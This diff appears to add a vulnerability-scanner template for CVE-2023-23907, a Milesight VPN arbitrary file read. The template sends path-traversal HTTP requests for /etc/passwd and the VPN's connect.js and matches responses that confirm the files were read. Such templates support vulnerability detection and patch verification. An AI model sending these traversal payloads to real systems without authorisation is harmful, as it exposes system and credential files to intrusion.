@@ -1,0 +1,41 @@
+id: CVE-2023-23907
+info:
+  name: Milesight VPN Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MilesightVPN is vulnerable to an arbitrary file read vulnerability. Attackers can exploit this to read critical system files, leading to information disclosure.
+  reference:
+    - https://www.milesight.com
+  classification:
+    cve-id: CVE-2023-23907
+    cvss-score: 7.5
+http:
+  - raw:
+      - |
+        GET /../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+  - raw:
+      - |
+        GET /../../../../../../../../../../../milesight_vpn/server/connect.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vpn_server"
